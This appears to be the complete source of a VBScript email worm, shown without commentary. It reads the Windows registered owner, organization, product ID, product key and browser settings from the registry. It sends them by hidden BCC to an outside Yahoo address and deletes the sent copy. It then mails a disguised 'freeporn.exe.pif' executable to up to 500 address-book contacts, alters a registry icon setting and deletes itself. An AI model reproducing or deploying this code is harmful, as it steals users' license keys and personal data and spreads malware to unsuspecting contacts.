On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set out = CreateObject("Outlook.Application")
Set Mail = Out.CreateItem(0)
OWN = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
ORG = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization")
VER = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\Version")
NUM = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\VersionNumber")
PID = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\ProductId")
PKEY = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\ProductKey")
SPAGE = ws.RegRead ("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page")
DDIR = ws.RegRead ("HKCU\Software\Microsoft\Internet Explorer\Download Directory")
LANG = ws.RegRead ("HKCU\Software\Microsoft\Internet Explorer\International\AcceptLanguage")
Mail.BCC = "hemphoper@yahoo.de"
Mail.Subject = "Network Info"
m2 = "-Information :"
m2 = m2 & vbCrLf & "Date : " & date
m2 = m2 & vbCrLf & "Time : " & time
m2 = m2 & vbCrLf & "Computername : " & ComputerName
m2 = m2 & vbCrLf & "RegisteredOwner : " & OWN
m2 = m2 & vbCrLf & "RegisteredOrganization : " & ORG
m2 = m2 & vbCrLf & "AcceptLanguage : " & LANG
m2 = m2 & vbCrLf & "Version+Number : " & VER & " " & NUM
m2 = m2 & vbCrLf & "ProductId : " & PID
m2 = m2 & vbCrLf & "ProductKey : " & PKEY
m2 = m2 & vbCrLf & "StartPage : " & SPAGE
m2 = m2 & vbCrLf & "Download Directory : " & DDIR
Mail.Body = m2
Mail.DeleteAfterSubmit = True
Mail.Send
Dim Nec
Set HH=CreateObject("Outlook.Application")
For Nec=1 To 500
Set Mail=HH.CreateItem(0)
Mail.to=HH.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject="Some freeporn"
Mail.Body="Here is the file you asked for..."
Mail.Attachments.Add("C:\freeporn.exe.pif")
Mail.Send
Next
HH.Quit
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKEY_CLASSES_ROOT\htmlfile\DefaultIcon\",_
"C:\Windows\System\Shell32.dll,32"
fso.DeleteFile wscript.ScriptFullName
